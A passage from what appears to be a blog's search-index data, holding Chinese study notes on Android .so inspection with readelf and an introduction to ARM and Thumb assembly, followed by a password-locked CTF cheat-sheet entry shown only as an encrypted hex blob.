fprintf@LIBC (2) 10: 00000000 0 FUNC GLOBAL DEFAULT UND dladdr@LIBC (3) 11: 00000000 0 FUNC GLOBAL DEFAULT UND __aeabi_memclr8 12: 00000000 0 FUNC GLOBAL DEFAULT UND __aeabi_memcpy 13: 00000000 0 FUNC GLOBAL DEFAULT UND __gnu_Unwind_Find_exidx 14: 00000000 0 FUNC GLOBAL DEFAULT UND snprintf@LIBC (2) 15: 00004018 0 NOTYPE GLOBAL DEFAULT ABS _edata 16: 00004019 0 NOTYPE GLOBAL DEFAULT ABS _end 17: 00000975 36 FUNC GLOBAL DEFAULT 13 Java_com_assassinq_easycp 18: 00000999 44 FUNC WEAK DEFAULT 13 _ZN7_JNIEnv12NewStringUTF 19: 00000b87 72 FUNC WEAK DEFAULT 13 _ZN7_JNIEnv15RegisterNati 20: 00000b5d 42 FUNC WEAK DEFAULT 13 _ZN7_JNIEnv9FindClassEPKc 21: 00004018 0 NOTYPE GLOBAL DEFAULT ABS __bss_start 22: 000009e9 224 FUNC GLOBAL DEFAULT 13 JNI_OnLoad 23: 00000ac9 52 FUNC WEAK DEFAULT 13 _ZN7_JavaVM6GetEnvEPPvi 24: 000009c5 36 FUNC GLOBAL DEFAULT 13 sayHi 显示 Dynamic Section： 123456789101112131415161718192021222324252627282930313233$ readelf -d libnative-lib.soDynamic section at offset 0x2e8c contains 29 entries: Tag Type Name/Value 0x00000003 (PLTGOT) 0x3fb0 0x00000002 (PLTRELSZ) 136 (bytes) 0x00000017 (JMPREL) 0x7c8 0x00000014 (PLTREL) REL 0x00000011 (REL) 0x6e0 0x00000012 (RELSZ) 232 (bytes) 0x00000013 (RELENT) 8 (bytes) 0x6ffffffa (RELCOUNT) 26 0x00000006 (SYMTAB) 0x1f0 0x0000000b (SYMENT) 16 (bytes) 0x00000005 (STRTAB) 0x380 0x0000000a (STRSZ) 467 (bytes) 0x6ffffef5 (GNU_HASH) 0x554 0x00000004 (HASH) 0x5a0 0x00000001 (NEEDED) Shared library: [liblog.so] 0x00000001 (NEEDED) Shared library: [libm.so] 0x00000001 (NEEDED) Shared library: [libdl.so] 0x00000001 (NEEDED) Shared library: [libc.so] 0x0000000e (SONAME) Library soname: [libnative-lib.so] 0x0000001a (FINI_ARRAY) 0x3e3c 0x0000001c (FINI_ARRAYSZ) 8 (bytes) 0x0000001e (FLAGS) BIND_NOW 0x6ffffffb (FLAGS_1) Flags: NOW 0x6ffffff0 (VERSYM) 0x650 0x6ffffffc (VERDEF) 0x684 0x6ffffffd (VERDEFNUM) 1 0x6ffffffe (VERNEED) 0x6a0 0x6fffffff (VERNEEDNUM) 2 0x00000000 (NULL) 0x0 SO Helper无名侠大佬开发的软件。可以用来快速地获取 so 文件的一些基本信息，提供较弱的汇编功能。 ARM 汇编代码ARM 是 ARM 公司的 32 位处理器，其汇编指令的机器码就是 32 位。 ARM 汇编语言是一门“低级”语言可以和系统的底层相互沟通； ARM 汇编语言编写的程序运行速度快，占用内存少； ARM 编写的代码难懂，难以维护； C 语言能实现的 ARM 汇编语言都能实现； ARM 具有 31 个通用寄存器，6 个状态寄存器； ARM 处理器支持 7 种运行模式。 用户模式：ARM 处理器正常的程序执行状态。 快速中断模式：用于高速数据传输或通道处理。 外部中断模式：用于通用的中断处理。 管理模式：操作系统使用的保护模式。 数据访问终止模式：当数据或指令预取终止时进如该模式，可用于模拟存储及存储保护。 系统模式：运行具有特权的操作系统任务。 未定义指令中止模式：当未定义的指令执行时进入该模式。 ARM 汇编难以分析的原因：IDA 自身的缺陷；函数库与类有时无法识别；自身对 ARM 汇编的熟练度。 函数参数传递遵循 ATPCS 规则，前 4 个参数使用 R0~R3 传递，剩余参数通过堆栈传递。 ARM 和 ThumbThumb 是 16 位的 ARM 汇编。一般地，ARM 每行代码占 4 个字节码，Thumb 每个指令占 2 个字节。两者不能混用，但可以通过 BX、BLX 等指令在跳转的时候实现切换。在动态调试的时候，IDA 对 ARM 和 Thumb 的分析会混淆，可以用 Alt+G 来修改相应的识别。 ARM 寄存器 R0-R7：通用寄存器 R8-R10：不常用的通用寄存器 R11：基质寄存器（FP） R12：暂时寄存器（IP） R13：堆栈制作（SP） R14：链接寄存器（LR） CPSR：状态寄存器 ARM 指令寄存器交互指令 LDR：从存储器中加载数据到寄存器。 LDR R1, [R2]：把 R2 指向的位置的数据给 R1 STR：把寄存器的数据存储到存储器 STR R1, [R2]：在 R2 指向的地址，存储 R1 LDM：将存储器的数据加载到一个寄存器列表。 LDM R0, {R1, R2, R3}：把 R0 中的数据一次加载到 R1、R2、R3 SDM：将一个寄存器列表的数据存储到指定的存储器 SDM R0, {R1, R2, R3}：把 R1、R2、R3 加载到 R0 单元 PUSH：入栈 POP：出栈 数据传送指令 MOV：将立即数或寄存器的数据传送到目标寄存器 数据算数运算指令ADD（加法）ADD 将把两个操作数加起来，把结果放置到目的寄存器中。操作数 1 是一个寄存器，操作数 2 可以是一个寄存器，被移位的寄存器，或一个立即值。 123ADD R0, R1, R2 @ R0 = R1 + R2ADD R0, R1, #256 @ R0 = R1 + 256ADD R0, R2, R3, LSL#1 @ R0 = R2 + (R3 &lt;&lt; 1) 加法可以在有符号和无符号数上进行。 ADC：带进位的加法 SUB（减法）SUB 用操作数 1 减去操作数 2，把结果放置到目的寄存器中。操作数 1 是一个寄存器，操作数 2 可以是一个寄存器，被移位的寄存器，或一个立即值。 123SUB R0, R1, R2 @ R0 = R1 - R2SUB R0, R1, #256 @ R0 = R1 - 256SUB R0, R2, R3, LSL#1 @ R0 = R2 - (R3 &lt;&lt; 1) 减法可以在有符号和无符号数上进行。 SBC：带进位的减法 MUL（乘法）和 DIV（除法） 给出的所有操作数、和目的寄存器必须为简单的寄存器。 不能对操作数 2 使用立即值或被移位的寄存器。 目的寄存器和操作数 1 必须是不同的寄存器。 不能指定 R15 为目的寄存器 MUL 提供 32 位整数乘法。如果操作数是有符号的，可以假定结果也是有符号的。 MLA：带累加的乘法 除法指令 DIV 的条件与乘法类似。 SDIV：带符号除法 UDIV：不带符号位除法 数据逻辑运算指令 AND：与 ORR：或 EOR：异或 LSL：逻辑左移 LSR：逻辑右移 比较指令 CMP：比较指令 其他指令 SWT：切换用户模式 DCB：伪指令 跳转指令 B：无条件跳转 BL：带链接的无条件跳转 BLX：带状态的无条件跳转 BNE：不相等跳转 BEQ：相等跳转 偏移地址计算 ARM：低 27 位是偏移位置 偏移 = (目标地址 - 当前 PC 地址) / 指令长度 正数下跳，负数上跳 Thumb 同理 目标地址 = 偏移 * 指令长度 + 当前偏移地址 ARM 代码编写处理器架构定义： .arch 指定了 ARM 处理器架构。 armv5te 表示本程序在 armv5te 架构处理器上运行。 .fpu 指定了协处理器的类型。 softvfp 表示使用浮点运算库来模拟协处理运算。 .ebi_attribute 指定了一些接口属性。 12345678910.arch armv5te @处理器架构.fpu softvfp @协处理器类型.ebi_attribute 20, 1 @接口属性.ebi_attribute 21, 1.ebi_attribute 23, 1.ebi_attribute 24, 1.ebi_attribute 25, 1.ebi_attribute 26, 1.ebi_attribute 30, 1.ebi_attribute 18, 1 段定义： .section：定义只读数据，属性是默认 .text：定义了代码段。 注释方法： /.../：多行注释 @：单行注释 标号方式（和 8086 类似）： 123loop: ...end loop 程序中所有以“.”开头的指令都是汇编指令，他们不属于 ARM 指令集： .file：制定了源文件名。 .align：代码对其方式。 .ascii：声明字符串。 .global：声明全局变量。 .type：指定符号的类型。 声明函数的方法： 12345678910.global 函数名.type 函数名, %function函数名: &lt;...函数体...&gt;声明一个实现两个数相加的函数的代码.global MyAdd.type MyAdd, &amp;functionMyAdd: ADD R0, R0, R1 MOV PC, LR ARM 处理器寻址方式立即寻址12@ 井号（#）作为前缀，表示16进制时以“0x”开头MOV R0，#1234 @ R0=0x1234 寄存器寻址1MOV R0, R1 @ R0=R1 寄存器移位寻址五种移位操作： LSL：逻辑左移，移位后寄存器空出的低位补 0； LSR：逻辑右移，移位后寄存器空出的高位补 0； ASR：算数右移，移动过程中符号位不变。如果操作数是整数，则移位后空出的高位补 0，否则补 1； ROR：循环右移，移位后移出的低位填入移位空出的高位； RRX：带扩展的循环右移，操作数右移移位，移位空出的高位用 C 标志的值填充。 1MOV R0, R1, LSL#2 @ R0=R1*4 寄存器间接寻址1LDR R0，[R1] @ 将R1寄存器中的值作为地址，取出地址中的值赋予R0 寄存器间接基址偏移寻址1LDR R0, [R1, #-4] @ 将R1寄存器的值-0x4的值作为地址，取出地址中的值给R0 多寄存器寻址1234567@ LDM 是数据加载命令，指令的后缀IA表示每次执行完成加载操作后R0寄存器的值自增1LDMIA R0, &#123;R1, R2, R3, R4&#125;@ R1=[R0]@ R2=[R0+#4]@ R3=[R0+#8]@ R4=[R0+#12]@ ARM中，字表示的是一个32位。这里+#4的原因是因为32位占4个字节 堆栈寻址12STMFD SP!, &#123;R1-R7, LR&#125; @ 入栈，多用于保存子程序堆栈LDMFD SP!, &#123;R1-R7, LR&#125; @ 出栈，多用于恢复子程序堆栈 块拷贝寻址块拷贝可实现连续地址数据从存储器的某一位置拷贝到另一位置。 1LDMIA R0!, &#123;R1-R3&#125; @ 从寄存器指向的存储单元中读取3个字到R1-R3寄存器。 相对寻址相对寻址一程序计数器 PC 的当前值为基地址，指令中的地址标号作为偏移量，将两者相加之后得到的操作数的有效地址。 Referenceshttps://www.bilibili.com/video/av45424886https://blog.csdn.net/miao_007/article/details/87632758https://stackoverflow.com/questions/4629308/any-simple-way-to-log-in-android-ndk-codehttps://www.jianshu.com/p/acbf724fdcc9https://blog.csdn.net/afei__/article/details/81031965https://www.luoxudong.com/360.htmlhttps://www.jianshu.com/p/23af9151837ehttps://juejin.im/post/5afe28446fb9a07aa0483d0ahttps://www.52pojie.cn/thread-699268-1-1.htmlhttps://www.52pojie.cn/thread-673175-1-1.html","categories":[],"tags":[{"name":"re","slug":"re","permalink":"qianfei11.coding.me/tags/re/"},{"name":"android","slug":"android","permalink":"qianfei11.coding.me/tags/android/"}]},{"title":"【TOP】CTF CheatSheet by AssassinQ","slug":"CTF-CheatSheet-by-AssassinQ","date":"2020-01-24T16:00:00.000Z","updated":"2020-02-18T08:54:39.374Z","comments":true,"path":"2020/01/25/CTF-CheatSheet-by-AssassinQ/","link":"","permalink":"qianfei11.coding.me/2020/01/25/CTF-CheatSheet-by-AssassinQ/","excerpt":"Continue Reading...","text":"Enter Password and Continue Reading... 33ba61e20bc39ad8f18bf8924202a015889adb009f73bedbb4c257e3759f480620e86edb1880390bb72371e75e0ee53db811a123d2c9b29c350b9b2e2d8cf548198e09a0482ebc0403fdcd89b1ea1ad9d36f2769bd4759dc403a24008d8269726bf21555d26e6c93125129f4429e13339e3b4f0522441ce57534d64d5a2dcb0e19acb0b6b083df8d396a06b675c7c7b548f4809d7cd54e0bd2f87fd4920876cbe60ae36343ab8c401c18c5b3a01ca9aa02cf1a3ee91ba5c4f4240266c1528dce5f4d6c05b6862aa32acfec49ae82f4ed430fa6c5491c228de59df39fbe67caf0abdfe3cf84cb26d71948d62a28ce8a94d157ffa95560df0d5431bcbc1962daf9ecd4566a05c776113b1b8fc7f5fe911b7bb8fc8ee8246a439e34a9a153bccff4a7c9ff811d072504aeb28a792413a1d00dba54ab9e9e9b36e7c9d282a210dc7e988318bb612b86b88d1dac845ab89aa4e2246b8b66e1eea2f490b62953d32f451628fdeeb6e76b47fff06222a1e21e78f1df29ae2d467f63348e8599c79dd73a490c7194343b5557052502648e52251ad9d55cc20b3934257d04ec1a63e0fb1407674445d794c6d4fab8da3ef58f12e18a399f12f8fa953de170744feee8734f3ebc2a6b0520f113e541e6da96952ff245ca8cf821bb166b0abdd04a9a96352013e6bb7eebfcb9b19bd8dbada1f044da6c3ca0bd73f5a8fe7e76e710130fc428cc5730bddf3adddd190ab911c6193458b33306467067813cae125cfa33da82dd9cd7f2645adf20223362188876b57d3574032cf8a286343b9af97369c025837644619df8154322cb729dbe5f79cc0c378f316ce93f86db81a6797d83de5b83b554577f397f59e13649c17a7b77ab5d198792a4a45b1819a0c30022036729d2e435f572de4d25e4f4967d5f8a64ded6ec01fe3de1178620d9bbcf920f175f9d20a9e90685e7cfe993f6b3fa67a9fcd2ba420ae26165882e6de0a3703c6e586cd8f0c313329f489bede26233656f648c69691e4c92b3babf5b942e7e2a36b2d21891a7a673a725dc097bd7de59f74fec723b9ea9ae205f8f5cc284901ed77cddf1aadae2135e3ff7af6c7c0575930e65d05a26db9fa12b90f1d161f6750fb822da755faa3cdaa50a8a9214b49c249b444c5af9d4f5adafbf9d4dc1d5c34b6dc7799835184494256a3746ab2df2ae9dc6d82f0e18282ba6d5d81d09a2a2199f32c9f6d1c7b2da736c56ce71a76cae2e7c89c81790364500d92f9ba639fced37ef3369501119cf9fb8c7a32f542690c91cd59af3f2e5fa998b4972de889ef1509c0be9094696d7247e0cc740f160d3c9c6a96f6d73b939bc4ad206ba5300659f2f4a8a10b753d831499973bc207f34c40390f5940ed00057d8645c4172087f1acda34ea02e4adb83991d27a9926b4fd3c6e419b18819cea795d9d94b3588f411f37fed7ee0d0ff4707fb89e0eb35b0b967b2aedeed7ef23e8a934c7df13a254bc8114f907d029fa7a5d26a4d2e3a499c8f92196cf97c64f9e6ebd1f1ad230c2aa841c87287cc53d7c352228f6d2b2d6fb765d8d82ceb349cf912b5b39dbc90eb750357ab7ce925de7f10ca91c869c77a940ac0fe9ee573ebb65498b14304953ad7874af019fcf6f0bbec8f55a570e79adb944200629373da37079850a9811a791e26021fa3c4695539d55eb0bfb2783ca4af0a6f00ad0be84feeca0c3fc29fbec2d38c99015ad799085826546166fb8a612392f3e71dfcd316b89d4e17cc619b9a6adba2d99d7ca532e65187d7d68ea5d11e4efcfcc9669498b949433193887de86e84cb5565fca4c6f09e92be61bcc7ed7d94502b57dfe279e5421a5f11e90dfdf5ac7acf8250166b76608d30fbdac3da5dd84a585495195fe262bcc1efef01e7c8769eb578448166bc32e6e18f674bcfb25b25fcde9c0a450a005ae3eee818ed5a6a02c7332357a265e50e05287a407830aa694d2e2e9256804d3a5f2c3633ac8662178e44dd6ad20f0759122dae74dbafdaf2dbf6eb0aa29f7c0b0c2a18bea9f39cff06382b68f1d42fc469246419245f06251946febc0ade36b4d6b185bcc9bab04729021bfaa608739adb3477907474f76ac8321c6e50781f30930546dfba06d0f6e275bd2660c8a6250e8fcd40402b9f8c0fcb99c62610f59ed30d9aac8385c4d495b0d8a09945d9310f2e17789c09cacd024d0c4259ef167e0492d5888d22851067a41996315464dc41dbb5eabd6be2bf532cf29f1e9096fa887adb8a8a59ec4afe76d0ad9aa4918011a3936b55109921e4c5c2bd9817c0fb85ebe1a6f5bbe99b3abdeaf5b3bed89df5525b3c7d9990c72e74ea1ca8fafc5bf10f1c2fec123e1002407ed8366cfaefa5cea0bde01c710a2134cc334a1b2362427f12906569a710cc1974cfb5e7c5949b2e2d452cbb90f1a77394d05dea2079df5de44bd99ad531bd946d7fb0aeb4686e23da467f86478a42a380cc48ac8af971ef783990feadd4aa2aa92af88b8c5db7b0b0ceed99a7b2aad3fa9a437e9023f3beb34e1dccfb8ce3ffed25217392b1e49784f9b3d37c43e97e624b7c583d540d739a1ebacc4578a50451d99c06f63d4fc0133937d192f87402dc9ef1efd32f46852f627aee8f7b62b0b6e84c9857db17e8dd2be65f1b5b35defdab80b820e1d53c8c2da6091019e16a400c3afee196d384c025d8317c1d121b688f9116bf8269fe702ed8f07897f3e4b769749168014aab52aa195a723ccd42df50509c21f3b5af908a081270d7d50e519b68ab45bff2a38f1e6552105114bab23c663b27609f04a83a58ab03c433460fb9dcaef680991b746906335c08a7ee8e5bdeca7cfbeef771531f9ac9fb5774791867b245baacbb5757833ce47936f8d628b6f266c7549795aae3d27c16de55705f5d1e01071b032b448c48e5b2ccbce45d0a4096ea0dc0553d9e999a863521bcd5f7a0984eab8777ec5f7bc1086c13d3347a1f8a90b2c2369eeaf2f461a30d6030cdefd1e4d990221b8a8af665ce75bcbf1d210745e317ecaa078c47bc4d859988ceebf856001f9ccac35dc64da854072f86ea7ce7067fcea57d1acb2a3e09c4f1fd9189933a95210231376943f51dc37641f4daa90b7e1c45143c76e821f35122ba24c4cc1b00a3a7acd7964edecccde2c3e71156e91379fc5ce01cf4df88cbcc092b9b5693537ea915e91da40f0909dcffe087067585cb91d3c9b1e84dd133a230c7d7205c0bc696b7356e51ac1fa9e8fbb9f459a4533a497bbdd5f4e1732c82c094ec1a213a4b6c0a4189fb4668a2812ec9dfb94cd963f7d04925471c18542fdadcce30c6a559af83932681db6e1547db9de04b4e3ba25578cc2be7bee1d53ee77b27be3076c6adc116fa2a13136e00720f1981dfe15603354fe889c99ddaa008a7226b85f22a08264cadea3584019569772e82a1fc467a66c3232c08c93bcfea6fa23dea99ff977d2a0be7d6188971fbb63b0fd6c34fd2eeac9076ff34bf6677ecb8100c25e779bb22c6a9170f43ea8876d94b9381ff452f2f212e073a8f13e1afb6b12ef7b00ed8d6d69566c4057170fa72cb975dfd973a36cde5c78277e7ca4083f9e30188576f15ef839851d64f6a7b78d94f833a1d3fd89cc9edf34018f52f7b29903ab7a39fe9323d3379f6ecdc04dbe675fb13938fd0e49d8582b8c5c00368a02dc41a9e94699ed16ad198ed3b168bdb69fb1531a43051b642ff06c612a16eb29d82fb57ee4d816dcf12bf42b1f07101c53824d0d5e2b302a2b4bf2697dacbccd54892f988286bf3c88e85d5d6af8426a79725d02d400befa0f20926e6232f71bac92fc28f17fc1cd11e1588e21aedb809b558e01790d87bfd5ab0201d27b0419ae71fc71a0c3e8802442c09a45adbdb34d60e30ce59cf94ac3470e171d042dcb6299eb7564b271283081f0c7a5185e1add287cd35f1acf993cd8041555a76e852e6871e161efa137d8ddd16264673c3df9a808efce9f1d11f54cd445c4aaf07e85136735021398ee843ce554b0c06132f4fad323830eb69563a0b9492032fac88a46232ffe4864f08327864233530f47bcb48a65ee70d6b483f14ed951c65569f6237a56e3666d0048783ea90a442a149127aa98d228e4d0ad29f5fd4794fa0cdc2cc8eb407ba3a876fcc54bb6870c1561b5ec50bdc0c6965a65066ead7aeb62cf1feb3e72fbb6e0f227f19672df25d6bb10fc4e270df5d620650c77f6434f191380311918a974096a55b59caad3f779572b77d7b17bebf494572504bc6f0b5ce871cf52ea92b55c15f89586c5253693813e48b3a399e2ee41e8f53acb2a5a0d66d9404fd18f7773bb57f4d49a73781d35778307dd8f557e4214ec45f2e2aefb1eef02af05fb49bf48a3f8e0287bb5bc9997b097f1695cb9d6f915bcbe87e9b1b60ceaf447bb60d25303c72fc58042c1b686021ba0e11dfd32db3aa46f9157ad0015e5a8eecb250beb1b325daab09248b9464bb924f2c21eb108e4735575bae2379fc9d468089af8912d30dbc09fa23d6e1a6a435f379ae43f87383df31a896aa6300691c3ee1db0304c746822a780faed714145beeaab46194cffb6ae9b884cc2c990c6042942fe1003298784768a3fc4121aafba9844f8761a9146343d43a30a7e741c365c1509f653a5f16212612a39060634e3b97a45af5016d0c30dc3f1ceec0a223d0ece47d2ddf1aa500213c5ab2cab33ef4b7ef71290ef7e0e7131f3cf46a100c2941ffc6c932d169c2882cbbb61f1827cdc17e3054f7a97628b0f1068ee60f2eb1f6f6cff5a47bf6f5c24460742bd90e79cb0cf9f98521cf9784b05e57a5b0e7d3cb34d61c771c41d77b7db0093c2e5f9a2600e3eb9d441de1b11fe953025ecffa7c0950040990cb0673af12021d9edf48918074fe130155ff9b1ea674a4dacec31aa3b43cf766e4b5ac75ac8ba42b8b868320dd4b247ce9d11e1374952bc5ffcfc1d6dca8bdf05c9826490b9ebde1310d0a9267341d77997e14c58a9c2ed26caa0630491affa6f0bd9fa238caed329a20a7ce0b0821486779a967bc29d4138cd8d87f29e7c91b2030f08ae6c276b3ca13403ed4e83fef3948a6674ec9dfbfb1d4a4aae60e7bac081ca34a28505c8311812b9b7d78193ee1411ab6fb4af9cf2af60d9eac390049297a75256ec837abf16ec71dfb19db89aee8f1e1c473810dd4b1482bff0680933bb8382795ece7533516fd386e37caa59ea8fb4a5071db7b6bf95c38f520229a9377e0413bc4a1d4f0b074a8513f2ed406ef7ecda9b4b3953d4834972360ad22f8a6b1ced745ab63a989ce401fe59517dab75d39fead0da4ef0c0405cb7ec4806cce20358fa30afb9c5af0f2698872f623322998140f92ab3758ee4d17776913855831c80d6ceacc75e075ecffd739f33f7283488a9c470d7ce7f6380c35adf6f8dd4b97d7fb80a29d34f778f289c8db2373b8cbd0c4f6a016d50dff22f11b09f6ef034d7b7488c9f122ff76589357dd604eeeb37b61cae51f45024227dcf7ff1e04c4e974251d3af96dfca55fc2d66752740c929bb80c6cbbcbe016082879687ae5499498173d41a7449b1c075c621808d38d0c60c174e9b24c9dc874f82f18c7fd572009255537aafb93290a121bc5d103f838ab0eef734b085b981a0d0c3a9dae0196e1235fec27caea4be55c8c590dffc72b7c6a50cb89ee15032debf87c360a5218406218df9a72370c0d28b27b3a783ae6fffc548cc625a075d94d2b70ba3edfa6897e1b115cfe415b3290442efb894e2bccfbf8a088104c505ddfc036d135289b7910d8ee4e56397a60899d7afa9314571d5ff30b7bc1ce2c33a90c479635704250c9254cd2293ce4a8a97ab423234e2b50247228f433385ede6317cf0454b59581e90c263bdb6a0ddeb0ff6792b315dbc3d7032070ed8cdc71c79ad5d29e10617df64fa336b197a0dbfbc70f311037e35e07252886c8cd77e2b5cfc1f0986467dc2512d0f42e5df448e61f4f949434427cc71db5c1970078490f4983f339b9a97ee25868b6b37083719c98753ead08fc58bca747b440fb8a262d3ea89cc2c83e9ec751822e0d7788a8626197aec9fdc347e55561dd2b2b399bb6b278041e83c7728b4021149536b5b7f12234f7c2209a8d19948b70bcb559180240a9ca66e559c191b6af0960bc4b3bf6031562622e29a041f8987133508d04ac1c65e13735820b2aa607f84a0df9086fc583daececb4091ef451eb994d521072142ec6e842f906d242b23bd0ea4e11d45398a439faf8d156d470e591a52e15306ca540afffc99708c7897f5bae5afe469ee603b91fa42b546f3748fa4b46575e73d3bb29f242a7b18502d1514ffcb3167a7a3471edaee00b8532d7b10df5e6f77196fe30e5fee90428828fd584a1096f727270f0920a754c2c542e2f2a9156e1af6c8ed0a350ce238add74fc9bcee9b0e10f788c0444a58e51fcc1124cd2c38551ca119a387d841731d54e3e35a3a386d99381bb6c45c795f2ae315c1840d65941b316106b49694716ad58293f9880b1b5f9300e5cef1d8c3ca4c7b7d469b9aab6fc1a2bb45a5e5875d85bde56c4d454a91cb48f0a3bb9010711c595c577999f4e8fae0abbde0cf2bfb181bedb94060e7b241c36d5d05991da0bfbcae294ebb5144a768e61a46bad965a7be83f3b32f4c0d5d68d7cf580ffac51c74cb198c8adb8784fe432d7b192f5e76cb19b1d73b6ab64656fa4a2223f0bb711ebac28e9df97dc07835c3a78533679180c8b2589fd5541ba7b286efc54ecf5173ebf50dcf258c16373197ad90115f1aede8e1903fabe7fd32db77d27f9a29f799715ff0bac42109a25e9127dd7a9b07e8e7fffcc4c59c8ba2a5d3b1bbda6c990ed8814d4432f5f22ab2233ca86dd5f5a346623fadfecdcb5d2450ba878e803fbbcd6d6a65672163dfb0193ee291668db43ac6e6f182378e30228df59a06ca4f1951cd746e48c567a51fe239a58f005830fec0493f04ed176e635cb7d81369f3ab4ff3f154351c87f2f69b6dfd30c3659e011cc99402eb1bd559c1ebcbc631db531555f77681d90854de4a73d578bb4b8b2477b99d6bc4f93d4bd728819c990597c0358c8787a3a42d098bc01b0d51b7e596aacb22fbf3d4cd2c53f5c5be031b771e645bb91f6672f25485cced39bd57c0c2b1649d51fd9e443c91a4b208636208d0be47f61dde9810812e739b0e41f1c805fde1d438fcf0bb310414500a30183d1bbda37202818e13c4ce3f05203e78a3774ff107fc0877f6c3e72a132e509e0f3d3e801c7872f2bd9d7bdbf5fb83729c1abd367f2d67293e98836dfc53ce9fd4d911071edd7959007081801f587203f9a0cc51f327c1809287355a0238defefef4f6f24010ec76f9e5a20c21a336229eb90ccfc053df89ff1b1a08810a344693884394ca9ed1c8d8b66d7211a4f9f8c114bff1c96804d937b990244fb4c6c0e83299b32397ec4fa561a690921c1852f6f077cd4e344cf4c427c53392287552aab4ca2063ab2f25274acafca342e598177fcc184e83a4effe80b742560d21fe114b68d404026a5b9d835743ce8a71630d81b78f250850bc1169cbf23af3f5c9f9267950cfe29a226a2cb4a5ac0310f7fae7fbb8f00f3ca8b31b130bc6ee7d293c123706ff00b0ce61b2194d3aa23f483f95df03fdd57b24a901a81c8a42e1321618800fffb2f1fc9e7cecb8290984e28a49800fc72099d71a12ac92d760cc1f25c8d4da6901a0d12641d7558304f79baf71aff3a1971a9ff5f7308ba754f96a9eb354c6ae177bc8b70e836a50cbe7d2c9c718050c62aa5a324113d1f1d65915bd26a9be716cacd1eb297849cf9fd4953e2280700bac2f938ba30be241262547c1747d81e8101266dc370a5562deaecf272e3cb22c114676d0ef1317c54f07893ffa78726c4d43dd2d70b8955c513e96cb71218ab641c49197da7163f602546f5fe8d746ad686caf4d649ce0a93ebe2900b05d1c26390233179de63421b3631cd35d704c45e2ff2a4b77a49d27ce2d65557f211fc2f4b6b3f97285421285030f22075806dd1ccc617eb8315cf9b81b893ca017b72880ba906d4ba26c4e7af62a9b479cf8c2970dc23ad0dd88de4422050ac24235625a3e86580b92175d8b151b042aa8b8bb8efe37064da7d1edbb2d31c9e3273018b7daaca4265079bda88f04417eb82c2e496c3356b724f3300abe391c0dc4796d56e658ea101091a0cfc9585e9884db2dbdccd838af48ed5589c7e6440418cff921251d117e3b5e1d11be182be9f98ffa96ef4c73137038f5b703b720fd8edd293318e24f78cfbe94db25303fbb5a35caa87e533ce6c87fc6d0b006f2b8c834da1124ce2897edc5fcee25e1744edc3f088d8804cfad1818b26d82c442e42e81c80fdd05101c875c638071b2758c9f348b87bbbc722e47c330c3266038aa989558681e4a1d33ae9349c87af9e91b86da32d48e1df4937dc3e7c4e0dc479cfdfb3ac747be9e9c0fe9566732fea8a163e008835f9e7cffedafdff932604aa6e9eb40ac35273bafabea344e16c64ce92c2fccac926c8e7ab1b735c93b412732b0a8943e904c7d5c4b624e2d125effdd355e6b535b115713725ce49b131f399223ee080ff53e97d3f86b548344f2f7e9e49559a43b30396778ee1a38ad9ff98462a9d994b55638c0489ab4f827b152860f542ebc570b09cb4e10f545a2de20c607bf638d26622586bc83b412722b9c989ef056fc915865ebe36e973307f6f90159f6e8e1696b63a263187d5e1ad59e3b329a33a20d50447f4f5ef99b34ccbb9c1a94f786c500fc97a1685d1880f6545fe376748a875a0eb831acb868c4bf1dd041d57ce273f6c056eb2942e906210414441132ed0ae45c7f4800d95c920b42f8d053cc5cb45cbcf069ee095f7d3b9c22ddcfc2a0ce6ae8db399632b97c93b016dd750548a8761c57be945e37279054869b3cfb30a517200d21a5e6beccd7f4a7b925ee21093bfdecb63245a87811675b80e8a60aeca198e46a481dea8ea0240b96e800687353ce00616af5971c6ff3b2b6ff61251ab02c71c0d6c20b0fa5193dec29d55e9f98f9ee29613e0a0463e82017a28c770f1df62d7e149664729ccf72767d9db4e46afc2db13d68bc43323af98193ce1a3225dc57a0e456c301da50a5d04dc441bf6b734012ce552562c2674bf5fdaaae8b28bd6167b905e9049a5f276e06116002c9a2ce7533795ca54c995f3384c6a08de8f4f7cd83f4cab35a8f64ee6ef40e63fc4b514481b7c7962dd29a91f1b70958362daf3044a5d41bfa2140b8ee4fc8b0d97b37c2ea07cda0262ed4dc8f449cebcd27a689c787468ff7309eedae6ce17ef2c902ea01ce7bc65abb49016365331daf7ea88b9740048096ca1ace6b2c032302417ab6c50d6f12c46967cf90d0c7ce44017cf87fb66fab40a10243c71d511fc0279f9a8231029471dfc2240b49305ebe1aa37fa1cfb00c0cbab1a85625d8e849fb304ebfe0ed9d37372b5ad29a2b521c37211cd1e21f95bd0ae65a6072f21473186cefa0f10286ec8b440ba70854fd22ee52e6e751e968f1926ac2c15a4c5bf59f010a60f44999c9237771d89213588aad8b09133a12b1314a34f0d197e279b84917dca935ebe7cda7e2f9e1d94262b312186bfe9220c1a9cfe4dc556a6569e338bea7eb08cec579426d0029a6f99fdf2882cf87e6558f9c80206a71063d231900dcb50eea54b75b25411c50d2d3765f60bb9f3ba37f6c050169bc204b3b906b3eeb90d169008940de4cc38b2a1770340e7c31a2caccff1153e45fca4c545f86f2668c9718b290ab6b5e19fc76484b67f66539361e0cd21bcbdccfaf06d9cae740d4cfb42d66b0575eceb52d8b0232af65087b3d38bcad3127d1b13812d913b485948669d744d1e8c89d9af592f8c891203079aa027d8ec2ac6eadcdd3cbf70a74969e2135fca8f16f799d4b6cf1c14dbab3ba98a1ac5a3d99ccf7e6442014c88d336cf1ad12a05188f0524993914b7f8e1bb35fca489fe9834990e62924c6d2ef0e1a2512847e397430602f16ac39328e4dbb851385ca0c078e4e512728f0d3df91f340e6249874eac50ffcce9e0ecf874e376dddd4b80650e8a2ddadd1c84ff679f658b0f76e7ce984e87eb28d3b516d1960fd75032d2e6a0b7c25d55fcc1ee5a4517bfaaa550e5a283b988ca7952ef9d6f2a0a07c1ff93943b9fe8088f6e2c94b17dd1ae0b319351a28b10b7e719c12139ba1091caae484740678db2fe1961bb8e594015125d5961a5edbd9f949afff1e4fce07b5da0c16ee8c139b8b5f97605896571d6680beb0128c2f39efcf19d0c5065946ca8cc22ecb05becf302f4028eb754496a8cd45921da0470f2a0ad14a3b1047a2938159a96095fa82a06e93992659af4d5c0aa901179b00a7c780b85e113cbf54777f95da5230f6b134edfe88303fed8f374869d33b5c7731abccadf1fe49fd776781ae665500ccf213e621a2c9592f3817031f340488cc930461b13ea1d008c6b046bfba568657f2518e17c9b08877a1e2b53d067d7e9f3c1d4dd5a70393747b9ce3c4b6a7bea3c43f75f4ec65c24d061c52d80b9f06dd39cc460cd04f2d30f9ca51a4abc7770df1773aebd93416d38302d420303